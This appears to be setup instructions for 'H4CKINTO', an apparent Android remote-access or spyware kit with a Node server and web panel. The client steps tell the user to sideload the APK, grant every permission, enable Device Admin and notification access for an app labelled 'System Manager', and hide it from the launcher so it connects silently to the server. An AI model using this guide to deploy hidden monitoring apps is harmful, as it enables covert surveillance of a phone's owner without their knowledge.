# H4CKINTO Server Setup Instructions

## 🖥️ Server Configuration (Your PC)

### Current Server Details:
- **Server IP**: 192.168.1.101
- **Server Port**: 9400
- **Server URL**: http://192.168.1.101:9400
- **Status**: ✅ Running and accessible

### 1. Configure Windows Firewall
**Option A: Run as Administrator**
```cmd
netsh advfirewall firewall add rule name="H4CKINTO Server" dir=in action=allow protocol=TCP localport=9400
```

**Option B: Use the provided script**
1. Right-click on `configure_firewall.bat`
2. Select "Run as administrator"
3. Follow the prompts

### 2. Start the Server
```cmd
npm start
```
The server will start on port 9400 and be accessible from your network.

### 3. Access the Web Interface
- Open your browser and go to: http://192.168.1.101:9400
- Login with your admin credentials (check maindb.json for default)

---

## 📱 Android Client Setup

### 1. Build the Android APK
**Option A: Use the build script**
```cmd
build_android_client.bat
```

**Option B: Manual build**
```cmd
cd client_new
gradlew assembleRelease
```

### 2. Install on Android Device
1. Transfer the APK file to your Android device
2. Enable "Install from unknown sources" in Android settings
3. Install the APK

### 3. Configure the App
1. **Grant Permissions**: Allow all requested permissions
2. **Enable Device Admin**: Tap "Enable Device Admin" button
3. **Enable Notification Access**: Go to Settings > Apps > System Manager > Special Access > Notification Access
4. **Hide App (Optional)**: Tap "Hide App" button to remove from launcher

### 4. Connection Details
- The app is pre-configured to connect to: `http://192.168.1.101:9400`
- It will automatically connect when the app starts
- You can monitor connections in the web interface

---

## 🔧 Troubleshooting

### Server Issues
- **Port not accessible**: Check Windows Firewall settings
- **Server not starting**: Make sure port 9400 is not used by another application
- **Connection refused**: Verify the server is running and firewall is configured

### Client Issues
- **App not connecting**: Check if both devices are on the same network
- **Permissions denied**: Grant all requested permissions manually
- **App crashes**: Check Android version compatibility (requires Android 5.0+)

### Network Issues
- **Can't connect**: Ensure both PC and Android device are on the same WiFi network
- **IP changed**: If your PC's IP changes, update the SERVER_URL in build.gradle and rebuild

---

## 📋 Quick Commands

### Start Server
```cmd
npm start
```

### Build Android Client
```cmd
build_android_client.bat
```

### Check Server Status
```cmd
netstat -an | findstr :9400
```

### Test Connection
```cmd
powershell -Command "Test-NetConnection -ComputerName 192.168.1.101 -Port 9400"
```

---

## 🌐 Network Information

- **Your PC IP**: 192.168.1.101
- **Server Port**: 9400
- **Web Interface**: http://192.168.1.101:9400
- **Client Connection**: http://192.168.1.101:9400

Make sure your Android device is connected to the same WiFi network as your PC!
